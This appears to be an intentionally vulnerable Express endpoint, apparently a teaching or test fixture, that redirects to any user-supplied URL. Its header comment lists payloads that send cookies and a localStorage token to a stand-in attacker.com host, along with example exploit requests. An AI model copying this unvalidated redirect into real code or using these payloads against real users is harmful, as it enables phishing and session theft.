/**
 * BUG: Open Redirect Vulnerability
 *
 * This buggy implementation accepts ANY URL without validation.
 * It blindly redirects to user-supplied input, creating an open redirect.
 *
 * Attack vectors:
 * 1. Phishing: https://trusted-site.com/redirect?url=https://evil.com
 *    Users see a trusted domain but end up on a malicious site.
 *
 * 2. XSS via javascript: protocol:
 *    javascript:alert(document.cookie)
 *    javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)
 *
 * 3. Data exfiltration via data: URI:
 *    data:text/html,<script>window.location='https://attacker.com?c='+localStorage.getItem('token')</script>
 */

import express, { Request, Response } from "express";

const buggyApp = express();
buggyApp.use(express.json());

buggyApp.post("/redirect", (req: Request, res: Response) => {
  const { url } = req.body;
  // BUG: No validation! Accepts any string including javascript:alert('xss')
  res.redirect(url);
});

// Example exploits:
// POST /redirect { "url": "javascript:alert('XSS')" }
// POST /redirect { "url": "https://evil-phishing-site.com" }
console.log("BUG: Open redirect — no URL validation");
